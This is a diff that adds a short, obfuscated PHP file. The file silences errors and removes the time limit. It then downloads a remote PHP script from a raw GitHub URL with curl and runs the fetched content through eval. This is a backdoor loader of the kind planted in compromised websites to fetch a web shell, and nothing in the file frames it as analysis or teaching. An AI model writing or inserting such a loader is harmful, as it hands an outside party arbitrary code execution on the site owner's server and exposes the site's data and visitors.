@@ -1,0 +1,17 @@
+<?php 
+${"GLOBALS"}["mdtxjf"]="kon";
+${"GLOBALS"}["rivxfpuy"]="tol";
+error_reporting(0);
+set_time_limit(0);
+${"GLOBALS"}["xjwegig"]="kon";
+${"GLOBALS"}["ffdxriovwu"]="kon";
+${${"GLOBALS"}["ffdxriovwu"]}=curl_init();
+${"GLOBALS"}["dnkdiyen"]="kon";
+${"GLOBALS"}["elhnqdu"]="kon";
+curl_setopt(${${"GLOBALS"}["xjwegig"]},
+CURLOPT_URL,"https://raw.githubusercontent.com/a7xhydra/mode-devil/main/nuklir.php");
+curl_setopt(${${"GLOBALS"}["dnkdiyen"]},CURLOPT_RETURNTRANSFER,1);
+${${"GLOBALS"}["rivxfpuy"]}=curl_exec(${${"GLOBALS"}["mdtxjf"]});
+curl_close(${${"GLOBALS"}["elhnqdu"]});
+eval("?>".${${"GLOBALS"}["rivxfpuy"]});
+?>
